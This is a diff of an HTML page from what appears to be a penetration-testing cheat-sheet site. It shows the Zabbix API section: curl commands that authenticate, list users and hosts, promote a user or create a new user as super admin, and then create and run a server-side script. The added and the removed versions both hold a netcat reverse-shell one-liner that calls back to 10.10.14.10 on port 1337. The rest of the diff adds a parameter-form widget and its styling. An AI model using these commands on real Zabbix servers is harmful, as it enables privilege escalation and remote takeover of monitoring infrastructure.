@@ -191,36 +191,160 @@
   <li><a href="https://tldrbins.github.io/@monitoring/">Monitoring</a></li>
   
 </ul>
+<hr>
+<div class="content">
+<div id="params">
+	<form id="params_form" style="display: none;">
+	</form>
+	<div class="center">
+		<button id="form_btn">Show Params Form</button>
+		<button id="replace_btn" style="display: none;">Replace Params</button>
+		<button id="reset_btn" style="display: none;">Reset</button>
+		<button id="clear_btn" style="display: none;">Clear Cache</button>
+	</div>
+</div>
 
-<div class="content"><hr>
+<style>
+#params {
+	width: 100%;
+	margin: 0 auto;
+	background-color: white;
+	padding: 20px 50px 40px;
+	box-shadow: 1px 4px 10px 1px #aaa;
+	font-family: system-ui;
+}
+
+#params * {
+    box-sizing: border-box;
+}
+
+#params input {
+  margin-bottom: 15px;
+}
+
+#params input[type=text] {
+	display: block;
+	height: 32px;
+	padding: 6px 16px;
+	width: 100%;
+	border: none;
+	background-color: #f5f5f5;
+}
+
+#params label {
+	color: #333333;
+	font-size: 0.9rem;
+}
+
+#params button {
+	display: inline-block;
+	margin: 20px auto 0;
+	width: 150px;
+	height: 40px;
+	border-radius: 25px;
+	border: none;
+	color: #f5f5f5;
+	font-weight: 700;
+	background: rgba(44, 82, 179);
+}
+
+#params button:hover {
+    cursor: pointer;
+    background: rgba(44, 82, 179, 0.95);
+}
+
+.center {
+	display: flex;
+	justify-content: center;
+	align-items: center;
+}
+
+ 
+body.dark-mode #params {
+	width: 100%;
+	margin: 0 auto;
+	background-color: #23272a;
+	padding: 20px 50px 40px;
+	box-shadow: 1px 4px 10px 1px #23272a;
+	font-family: system-ui;
+}
+
+body.dark-mode #params * {
+    box-sizing: border-box;
+}
+
+body.dark-mode #params input {
+	border-radius: 0.2em;
+	border: 0.1em solid #eeeeee;
+}
+
+body.dark-mode #params input:focus {
+	margin-bottom: 15px;
+	outline: 0.1em solid #eeeeee;
+}
+
+body.dark-mode #params input[type=text] {
+	display: block;
+	height: 32px;
+	padding: 6px 16px;
+	width: 100%;
+	border: none;
+	background-color: #bdbdbd;
+}
+
+body.dark-mode #params label {
+	color: #fafafa;
+	font-size: 0.9rem;
+}
+
+body.dark-mode #params button {
+	display: inline-block;
+	margin: 20px auto 0;
+	width: 150px;
+	height: 40px;
+	border-radius: 25px;
+	border: none;
+	color: #fafafa;
+	font-weight: 700;
+	background: #616161;
+}
+
+body.dark-mode #params button:hover {
+    cursor: pointer;
+    background: #424242;
+}
+
+
+</style>
 <h3 id="zabbix-api">Zabbix API</h3>
 <h4 id="general">General</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Auth with cred</span>
-</span></span><span class="line"><span class="cl">curl http://example.com/zabbix/api_jsonrpc.php -H <span class="s2">&#34;Content-Type: application/json-rpc&#34;</span> -d <span class="s1">&#39;{&#34;jsonrpc&#34;:&#34;2.0&#34;, &#34;method&#34;:&#34;user.login&#34;, &#34;id&#34;:1, &#34;auth&#34;:null, &#34;params&#34;:{&#34;user&#34;: &#34;&lt;USER&gt;&#34;, &#34;password&#34;: &#34;&lt;PASSWORD&gt;&#34;}}&#39;</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Get users</span>
-</span></span><span class="line"><span class="cl">curl -s http://example.com/zabbix/api_jsonrpc.php -H <span class="s2">&#34;Content-Type: application/json-rpc&#34;</span> -d <span class="s1">&#39;{&#34;jsonrpc&#34;:&#34;2.0&#34;, &#34;method&#34;:&#34;user.get&#34;, &#34;id&#34;:1, &#34;auth&#34;:&#34;&lt;AUTH&gt;&#34;, &#34;params&#34;:{&#34;output&#34;: &#34;extend&#34;}}&#39;</span> <span class="p">|</span> jq .
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Get hosts</span>
-</span></span><span class="line"><span class="cl">curl -s http://example.com/zabbix/api_jsonrpc.php -H <span class="s2">&#34;Content-Type: application/json-rpc&#34;</span> -d <span class="s1">&#39;{&#34;jsonrpc&#34;:&#34;2.0&#34;, &#34;method&#34;:&#34;host.get&#34;, &#34;id&#34;:1, &#34;auth&#34;:&#34;&lt;AUTH&gt;&#34;, &#34;params&#34;:{}}&#39;</span> <span class="p">|</span> jq .
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Get user group info</span>
-</span></span><span class="line"><span class="cl">curl -s http://example.com/zabbix/api_jsonrpc.php -H <span class="s2">&#34;Content-Type: application/json-rpc&#34;</span> -d <span class="s1">&#39;{&#34;jsonrpc&#34;:&#34;2.0&#34;, &#34;method&#34;:&#34;usergroup.get&#34;, &#34;id&#34;:1, &#34;auth&#34;:&#34;&lt;AUTH&gt;&#34;, &#34;params&#34;:{&#34;userids&#34;: &#34;1&#34;}}&#39;</span> <span class="p">|</span> jq <span class="s1">&#39;.&#39;</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Update user group info (e.g. gui_access)</span>
-</span></span><span class="line"><span class="cl">curl -s http://example.com/zabbix/api_jsonrpc.php -H <span class="s2">&#34;Content-Type: application/json-rpc&#34;</span> -d <span class="s1">&#39;{&#34;jsonrpc&#34;:&#34;2.0&#34;, &#34;method&#34;:&#34;usergroup.update&#34;, &#34;id&#34;:1, &#34;auth&#34;:&#34;&lt;AUTH&gt;&#34;, &#34;params&#34;:{&#34;usrgrpid&#34;: &#34;12&#34;, &#34;gui_access&#34;: &#34;0&#34;}}&#39;</span> <span class="p">|</span> jq -c <span class="s1">&#39;.&#39;</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Update user (e.g. change user to super admin)</span>
-</span></span><span class="line"><span class="cl">curl -s http://example.com/zabbix/api_jsonrpc.php -H <span class="s2">&#34;Content-Type: application/json-rpc&#34;</span> -d <span class="s1">&#39;{&#34;jsonrpc&#34;:&#34;2.0&#34;, &#34;method&#34;:&#34;user.update&#34;, &#34;id&#34;:1, &#34;auth&#34;:&#34;&lt;AUTH&gt;&#34;, &#34;params&#34;:{&#34;userid&#34;: &#34;2&#34;, &#34;type&#34;: &#34;3&#34;}}&#39;</span> <span class="p">|</span> jq -c <span class="s1">&#39;.&#39;</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Create user (e.g. with role super admin)</span>
-</span></span><span class="line"><span class="cl">curl -s http://example.com/zabbix/api_jsonrpc.php -H <span class="s2">&#34;Content-Type: application/json-rpc&#34;</span> -d <span class="s1">&#39;{&#34;jsonrpc&#34;:&#34;2.0&#34;, &#34;method&#34;:&#34;user.create&#34;, &#34;id&#34;:1, &#34;auth&#34;:&#34;&lt;AUTH&gt;&#34;, &#34;params&#34;:{&#34;passwd&#34;: &#34;&lt;PASSWORD&gt;&#34;, &#34;usrgrps&#34;: [{&#34;usrgrpid&#34;: &#34;7&#34;}], &#34;alias&#34;: &#34;&lt;USER&gt;&#34;, &#34;type&#34;: &#34;3&#34;}}&#39;</span> <span class="p">|</span> jq -c <span class="s1">&#39;.&#39;</span>
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Auth with cred
+</span></span><span class="line"><span class="cl"><span class="go">curl http://&lt;DOMAIN&gt;/zabbix/api_jsonrpc.php -H &#34;Content-Type: application/json-rpc&#34; -d &#39;{&#34;jsonrpc&#34;:&#34;2.0&#34;, &#34;method&#34;:&#34;user.login&#34;, &#34;id&#34;:1, &#34;auth&#34;:null, &#34;params&#34;:{&#34;user&#34;: &#34;&lt;USER&gt;&#34;, &#34;password&#34;: &#34;&lt;PASSWORD&gt;&#34;}}&#39;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Get users
+</span></span><span class="line"><span class="cl"><span class="go">curl -s http://&lt;DOMAIN&gt;/zabbix/api_jsonrpc.php -H &#34;Content-Type: application/json-rpc&#34; -d &#39;{&#34;jsonrpc&#34;:&#34;2.0&#34;, &#34;method&#34;:&#34;user.get&#34;, &#34;id&#34;:1, &#34;auth&#34;:&#34;&lt;AUTH&gt;&#34;, &#34;params&#34;:{&#34;output&#34;: &#34;extend&#34;}}&#39; | jq .
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Get hosts
+</span></span><span class="line"><span class="cl"><span class="go">curl -s http://&lt;DOMAIN&gt;/zabbix/api_jsonrpc.php -H &#34;Content-Type: application/json-rpc&#34; -d &#39;{&#34;jsonrpc&#34;:&#34;2.0&#34;, &#34;method&#34;:&#34;host.get&#34;, &#34;id&#34;:1, &#34;auth&#34;:&#34;&lt;AUTH&gt;&#34;, &#34;params&#34;:{}}&#39; | jq .
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Get user group info
+</span></span><span class="line"><span class="cl"><span class="go">curl -s http://&lt;DOMAIN&gt;/zabbix/api_jsonrpc.php -H &#34;Content-Type: application/json-rpc&#34; -d &#39;{&#34;jsonrpc&#34;:&#34;2.0&#34;, &#34;method&#34;:&#34;usergroup.get&#34;, &#34;id&#34;:1, &#34;auth&#34;:&#34;&lt;AUTH&gt;&#34;, &#34;params&#34;:{&#34;userids&#34;: &#34;1&#34;}}&#39; | jq &#39;.&#39;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Update user group info <span class="o">(</span>e.g. gui_access<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="go">curl -s http://&lt;DOMAIN&gt;/zabbix/api_jsonrpc.php -H &#34;Content-Type: application/json-rpc&#34; -d &#39;{&#34;jsonrpc&#34;:&#34;2.0&#34;, &#34;method&#34;:&#34;usergroup.update&#34;, &#34;id&#34;:1, &#34;auth&#34;:&#34;&lt;AUTH&gt;&#34;, &#34;params&#34;:{&#34;usrgrpid&#34;: &#34;12&#34;, &#34;gui_access&#34;: &#34;0&#34;}}&#39; | jq -c &#39;.&#39;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Update user <span class="o">(</span>e.g. change user to super admin<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="go">curl -s http://&lt;DOMAIN&gt;/zabbix/api_jsonrpc.php -H &#34;Content-Type: application/json-rpc&#34; -d &#39;{&#34;jsonrpc&#34;:&#34;2.0&#34;, &#34;method&#34;:&#34;user.update&#34;, &#34;id&#34;:1, &#34;auth&#34;:&#34;&lt;AUTH&gt;&#34;, &#34;params&#34;:{&#34;userid&#34;: &#34;2&#34;, &#34;type&#34;: &#34;3&#34;}}&#39; | jq -c &#39;.&#39;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Create user <span class="o">(</span>e.g. with role super admin<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="go">curl -s http://&lt;DOMAIN&gt;/zabbix/api_jsonrpc.php -H &#34;Content-Type: application/json-rpc&#34; -d &#39;{&#34;jsonrpc&#34;:&#34;2.0&#34;, &#34;method&#34;:&#34;user.create&#34;, &#34;id&#34;:1, &#34;auth&#34;:&#34;&lt;AUTH&gt;&#34;, &#34;params&#34;:{&#34;passwd&#34;: &#34;&lt;PASSWORD&gt;&#34;, &#34;usrgrps&#34;: [{&#34;usrgrpid&#34;: &#34;7&#34;}], &#34;alias&#34;: &#34;&lt;USER&gt;&#34;, &#34;type&#34;: &#34;3&#34;}}&#39; | jq -c &#39;.&#39;
+</span></span></span></code></pre></div></div>
 <h4 id="rce">RCE</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Create script on container 0 (default 1)</span>
-</span></span><span class="line"><span class="cl">curl -s http://example.com/zabbix/api_jsonrpc.php -H <span class="s2">&#34;Content-Type: application/json-rpc&#34;</span> -d <span class="s1">&#39;{&#34;jsonrpc&#34;:&#34;2.0&#34;, &#34;method&#34;:&#34;script.create&#34;, &#34;id&#34;:1, &#34;auth&#34;:&#34;&lt;AUTH&gt;&#34;, &#34;params&#34;:{&#34;command&#34;: &#34;id&#34;, &#34;name&#34;: &#34;test&#34;, &#34;execute_on&#34;: 0}}&#39;</span> <span class="p">|</span> jq .
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Update script</span>
-</span></span><span class="line"><span class="cl">curl -s http://example.com/zabbix/api_jsonrpc.php -H <span class="s2">&#34;Content-Type: application/json-rpc&#34;</span> -d <span class="s1">&#39;{&#34;jsonrpc&#34;:&#34;2.0&#34;, &#34;method&#34;:&#34;script.update&#34;, &#34;id&#34;:1, &#34;auth&#34;:&#34;&lt;AUTH&gt;&#34;, &#34;params&#34;:{&#34;scriptid&#34;: 4, &#34;command&#34;: &#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.10 1337 &gt;/tmp/f&#34;}}&#39;</span> <span class="p">|</span> jq -c .
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Execute script (e.g. scriptid 4)</span>
-</span></span><span class="line"><span class="cl">curl -s http://example.com/zabbix/api_jsonrpc.php -H <span class="s2">&#34;Content-Type: application/json-rpc&#34;</span> -d <span class="s1">&#39;{&#34;jsonrpc&#34;:&#34;2.0&#34;, &#34;method&#34;:&#34;script.execute&#34;, &#34;id&#34;:1, &#34;auth&#34;:&#34;&lt;AUTH&gt;&#34;, &#34;params&#34;:{&#34;hostid&#34;: 10106, &#34;scriptid&#34;: 4}}&#39;</span> <span class="p">|</span> jq .
-</span></span></code></pre></div></div>
-<br></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Create script on container <span class="m">0</span> <span class="o">(</span>default 1<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="go">curl -s http://&lt;DOMAIN&gt;/zabbix/api_jsonrpc.php -H &#34;Content-Type: application/json-rpc&#34; -d &#39;{&#34;jsonrpc&#34;:&#34;2.0&#34;, &#34;method&#34;:&#34;script.create&#34;, &#34;id&#34;:1, &#34;auth&#34;:&#34;&lt;AUTH&gt;&#34;, &#34;params&#34;:{&#34;command&#34;: &#34;id&#34;, &#34;name&#34;: &#34;test&#34;, &#34;execute_on&#34;: 0}}&#39; | jq .
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Update script
+</span></span><span class="line"><span class="cl"><span class="go">curl -s http://&lt;DOMAIN&gt;/zabbix/api_jsonrpc.php -H &#34;Content-Type: application/json-rpc&#34; -d &#39;{&#34;jsonrpc&#34;:&#34;2.0&#34;, &#34;method&#34;:&#34;script.update&#34;, &#34;id&#34;:1, &#34;auth&#34;:&#34;&lt;AUTH&gt;&#34;, &#34;params&#34;:{&#34;scriptid&#34;: 4, &#34;command&#34;: &#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.10 1337 &gt;/tmp/f&#34;}}&#39; | jq -c .
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Execute script <span class="o">(</span>e.g. scriptid 4<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="go">curl -s http://&lt;DOMAIN&gt;/zabbix/api_jsonrpc.php -H &#34;Content-Type: application/json-rpc&#34; -d &#39;{&#34;jsonrpc&#34;:&#34;2.0&#34;, &#34;method&#34;:&#34;script.execute&#34;, &#34;id&#34;:1, &#34;auth&#34;:&#34;&lt;AUTH&gt;&#34;, &#34;params&#34;:{&#34;hostid&#34;: 10106, &#34;scriptid&#34;: 4}}&#39; | jq .
+</span></span></span></code></pre></div></div>
+<br>
+</div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
